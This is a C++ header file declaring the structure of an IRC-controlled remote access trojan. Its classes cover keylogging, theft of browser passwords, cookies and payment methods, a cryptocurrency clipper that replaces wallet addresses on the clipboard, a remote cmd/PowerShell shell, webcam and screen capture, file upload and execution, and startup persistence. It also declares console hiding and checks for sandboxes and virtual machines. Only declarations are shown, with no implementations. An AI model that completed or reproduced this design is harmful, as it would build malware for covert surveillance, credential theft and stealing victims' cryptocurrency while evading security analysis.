#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <random>
#include <memory>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <lmcons.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <wingdi.h>
#include <winuser.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/stat.h>
#include <dirent.h>
#include <signal.h>
#endif

// Forward declarations
class RemoteDesktop;
class RemoteCamera;
class Keylogger;
class PasswordRecovery;
class FileManager;
class ProcessManager;
class RemoteShell;
class CryptoClipper;

// Network communication structures
struct IRCMessage {
    std::string command;
    std::string target;
    std::string data;
    std::map<std::string, std::string> params;
};

struct ClientInfo {
    std::string clientId;
    std::string computerName;
    std::string username;
    std::string osVersion;
    std::string ipAddress;
    bool isAdmin;
    std::chrono::steady_clock::time_point lastSeen;
};

// Camera quality settings
enum class CameraQuality {
    LOW = 0,
    MEDIUM = 1,
    HIGH = 2,
    MAX = 3
};

// Main IRC Remote Access Bot Class
class IRCRemoteBot {
private:
    // Network components
    std::string ircServer;
    int ircPort;
    std::string ircChannel;
    std::string botNick;
    std::string operatorNick;
    
    // Connection management
    int sockfd;
    std::atomic<bool> isConnected;
    std::atomic<bool> shouldExit;
    std::thread networkThread;
    std::thread heartbeatThread;
    std::mutex messageMutex;
    
    // Client information
    ClientInfo clientInfo;
    std::string uniqueClientId;
    
    // Feature modules
    std::unique_ptr<RemoteDesktop> remoteDesktop;
    std::unique_ptr<RemoteCamera> remoteCamera;
    std::unique_ptr<Keylogger> keylogger;
    std::unique_ptr<PasswordRecovery> passwordRecovery;
    std::unique_ptr<FileManager> fileManager;
    std::unique_ptr<ProcessManager> processManager;
    std::unique_ptr<RemoteShell> remoteShell;
    std::unique_ptr<CryptoClipper> cryptoClipper;
    
public:
    IRCRemoteBot(const std::string& server, int port, const std::string& channel, 
                 const std::string& nick, const std::string& operatorNick);
    ~IRCRemoteBot();
    
    // Main bot functions
    bool initialize();
    void start();
    void stop();
    
    // Connection management
    bool connectToIRC();
    void disconnect();
    void sendMessage(const std::string& target, const std::string& message);
    void sendPrivateMessage(const std::string& nick, const std::string& message);
    
    // Message handling
    void handleMessage(const IRCMessage& message);
    void processCommand(const std::string& command, const std::string& params, const std::string& sender);
    
    // Client identification
    void generateClientId();
    void gatherSystemInfo();
    void announcePresence();
    
private:
    // Network functions
    void networkLoop();
    void heartbeatLoop();
    void parseIRCMessage(const std::string& rawMessage, IRCMessage& message);
    
    // Utility functions
    std::string encodeBase64(const std::vector<uint8_t>& data);
    std::vector<uint8_t> decodeBase64(const std::string& encoded);
    std::string getCurrentTimestamp();
    bool isAuthorized(const std::string& nick);
    
    // Startup persistence
    bool installStartup();
    void uninstallStartup();
    
    // Anti-detection
    void implementAntiDetection();
    bool checkForSandbox();
    bool checkForVirtualMachine();
};

// Remote Desktop Controller
class RemoteDesktop {
private:
    IRCRemoteBot* bot;
    std::atomic<bool> isActive;
    std::atomic<bool> isStreaming;
    std::thread desktopThread;
    std::mutex screenMutex;
    
    // Screen capture
    int screenWidth;
    int screenHeight;
    int captureQuality;
    
public:
    RemoteDesktop(IRCRemoteBot* parentBot);
    ~RemoteDesktop();
    
    // Desktop control
    bool start();
    void stop();
    bool isRunning() const { return isActive.load(); }
    
    // Screen capture
    std::vector<uint8_t> captureScreen();
    void setCaptureQuality(int quality);
    
    // Mouse and keyboard control
    void moveMouse(int x, int y);
    void clickMouse(int button, bool down);
    void sendKey(int keyCode, bool down);
    void sendText(const std::string& text);
    
    // Desktop streaming
    void startStreaming();
    void stopStreaming();
    
private:
    void desktopLoop();
    std::vector<uint8_t> compressImage(const std::vector<uint8_t>& imageData);
};

// Remote Camera Controller
class RemoteCamera {
private:
    IRCRemoteBot* bot;
    std::atomic<bool> isActive;
    std::atomic<bool> isFullscreen;
    CameraQuality quality;
    std::thread cameraThread;
    
public:
    RemoteCamera(IRCRemoteBot* parentBot);
    ~RemoteCamera();
    
    // Camera control
    bool start();
    void stop();
    bool isRunning() const { return isActive.load(); }
    
    // Camera settings
    void setQuality(CameraQuality qual);
    void setFullscreen(bool fullscreen);
    
    // Image capture
    std::vector<uint8_t> captureImage();
    
private:
    void cameraLoop();
    bool initializeCamera();
    void releaseCamera();
};

// Keylogger
class Keylogger {
private:
    IRCRemoteBot* bot;
    std::atomic<bool> isActive;
    std::string logBuffer;
    std::mutex logMutex;
    std::thread keylogThread;
    std::string logFilePath;
    
public:
    Keylogger(IRCRemoteBot* parentBot);
    ~Keylogger();
    
    // Keylogger control
    bool start();
    void stop();
    bool isRunning() const { return isActive.load(); }
    
    // Log management
    std::string getLiveLogs();
    std::string getOfflineLogs();
    void clearLogs();
    void saveLogs();
    
private:
    void keylogLoop();
    void logKey(int keyCode);
    std::string getWindowTitle();
    std::string getProcessName();
};

// Password Recovery
class PasswordRecovery {
private:
    IRCRemoteBot* bot;
    
public:
    PasswordRecovery(IRCRemoteBot* parentBot);
    
    // Chrome data recovery
    std::vector<std::string> getChromePasswords();
    std::vector<std::string> getChromeCookies();
    std::vector<std::string> getChromePaymentMethods();
    
    // Other browsers
    std::vector<std::string> getFirefoxPasswords();
    std::vector<std::string> getEdgePasswords();
    
private:
    std::string decryptChromePassword(const std::vector<uint8_t>& encryptedData);
    std::string getChromePath();
    std::vector<uint8_t> getMasterKey();
    bool copyDatabase(const std::string& source, const std::string& dest);
};

// File Manager
class FileManager {
private:
    IRCRemoteBot* bot;
    std::string currentDirectory;
    
public:
    FileManager(IRCRemoteBot* parentBot);
    
    // Directory navigation
    std::vector<std::string> listDirectory(const std::string& path = "");
    bool changeDirectory(const std::string& path);
    std::string getCurrentDirectory() const { return currentDirectory; }
    
    // File operations
    std::vector<uint8_t> downloadFile(const std::string& filePath);
    bool uploadFile(const std::string& filePath, const std::vector<uint8_t>& data);
    bool deleteFile(const std::string& filePath);
    bool runFile(const std::string& filePath);
    
    // Utility functions
    bool fileExists(const std::string& filePath);
    uint64_t getFileSize(const std::string& filePath);
    std::string getFilePermissions(const std::string& filePath);
};

// Process Manager
class ProcessManager {
private:
    IRCRemoteBot* bot;
    
public:
    ProcessManager(IRCRemoteBot* parentBot);
    
    // Process operations
    std::vector<std::string> getProcessList();
    bool killProcess(int processId);
    bool killProcess(const std::string& processName);
    std::string getProcessInfo(int processId);
    
private:
    std::string formatProcessInfo(int pid, const std::string& name, uint64_t memory);
};

// Remote Shell
class RemoteShell {
private:
    IRCRemoteBot* bot;
    std::atomic<bool> isActive;
    std::thread shellThread;
    std::string shellType; // "cmd" or "powershell"
    
#ifdef _WIN32
    HANDLE hChildStd_IN_Rd;
    HANDLE hChildStd_IN_Wr;
    HANDLE hChildStd_OUT_Rd;
    HANDLE hChildStd_OUT_Wr;
    PROCESS_INFORMATION piProcInfo;
#endif
    
public:
    RemoteShell(IRCRemoteBot* parentBot);
    ~RemoteShell();
    
    // Shell operations
    bool startCMD();
    bool startPowerShell();
    void stop();
    bool isRunning() const { return isActive.load(); }
    
    // Command execution
    std::string executeCommand(const std::string& command);
    void sendInput(const std::string& input);
    std::string readOutput();
    
private:
    void shellLoop();
    bool createShellProcess(const std::string& shell);
    void closeShellProcess();
};

// Crypto Clipper
class CryptoClipper {
private:
    IRCRemoteBot* bot;
    std::atomic<bool> isActive;
    std::thread clipperThread;
    std::map<std::string, std::string> cryptoAddresses;
    std::string lastClipboard;
    
public:
    CryptoClipper(IRCRemoteBot* parentBot);
    ~CryptoClipper();
    
    // Clipper control
    bool start();
    void stop();
    bool isRunning() const { return isActive.load(); }
    
    // Address management
    void setCryptoAddress(const std::string& type, const std::string& address);
    std::string getCryptoAddress(const std::string& type);
    
    // Supported crypto types
    void setupDefaultAddresses();
    
private:
    void clipperLoop();
    std::string getClipboardText();
    void setClipboardText(const std::string& text);
    bool isCryptoAddress(const std::string& text, std::string& cryptoType);
    
    // Address pattern recognition
    bool isBitcoinAddress(const std::string& text);
    bool isEthereumAddress(const std::string& text);
    bool isLitecoinAddress(const std::string& text);
    bool isDogecoinAddress(const std::string& text);
    bool isMoneroAddress(const std::string& text);
    bool isZcashAddress(const std::string& text);
    bool isDashAddress(const std::string& text);
    bool isBitcoinCashAddress(const std::string& text);
    bool isRippleAddress(const std::string& text);
};

// Utility functions
namespace IRCUtils {
    std::string generateRandomString(int length);
    std::string getComputerName();
    std::string getUserName();
    std::string getOSVersion();
    std::string getIPAddress();
    bool isAdministrator();
    std::string encryptString(const std::string& plaintext, const std::string& key);
    std::string decryptString(const std::string& ciphertext, const std::string& key);
    void hideConsole();
    bool addToStartup(const std::string& appName, const std::string& appPath);
    bool removeFromStartup(const std::string& appName);
    std::vector<uint8_t> compressData(const std::vector<uint8_t>& data);
    std::vector<uint8_t> decompressData(const std::vector<uint8_t>& compressedData);
}